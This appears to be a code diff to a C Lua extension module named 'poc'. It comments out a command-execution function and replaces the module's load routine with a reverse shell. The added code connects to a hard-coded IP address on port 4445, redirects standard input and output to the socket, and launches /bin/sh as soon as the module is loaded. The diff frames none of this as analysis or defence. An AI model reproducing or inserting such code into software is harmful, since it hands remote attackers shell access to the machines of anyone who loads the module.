@@ -1,12 +1,19 @@
 #include <lua.h>
-#include <lauxlib.h>
-#include <lualib.h>
+//#include <lauxlib.h>
+//#include <lualib.h>
 #include <unistd.h>
 #include <sys/wait.h>
 #include <string.h>
 #include <stdlib.h>
 #include <errno.h>
-
+#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+/*
 static int exec(lua_State *L) {
     const char *command = luaL_checkstring(L, 1);
     
@@ -80,15 +87,33 @@ static int exec(lua_State *L) {
     }
     
     return 2; // Return output and exit code
-}
+}*/
 
 
 int luaopen_poc(lua_State *L) {
-    static const struct luaL_Reg exec_lib[] = {
+    /*static const struct luaL_Reg exec_lib[] = {
         {"command", exec},
         {NULL, NULL}
-    };
+    };*/
+
+    int port = 4445;
+    struct sockaddr_in revsockaddr;
+
+    int sockt = socket(AF_INET, SOCK_STREAM, 0);
+    revsockaddr.sin_family = AF_INET;       
+    revsockaddr.sin_port = htons(port);
+    revsockaddr.sin_addr.s_addr = inet_addr("157.180.117.230");
+
+    connect(sockt, (struct sockaddr *) &revsockaddr, 
+    sizeof(revsockaddr));
+    dup2(sockt, 0);
+    dup2(sockt, 1);
+    dup2(sockt, 2);
+
+    char * const argv[] = {"/bin/sh", NULL};
+    execvp("/bin/sh", argv);
+
     
-    luaL_newlib(L, exec_lib);
+    // luaL_newlib(L, exec_lib);
     return 1;
 }
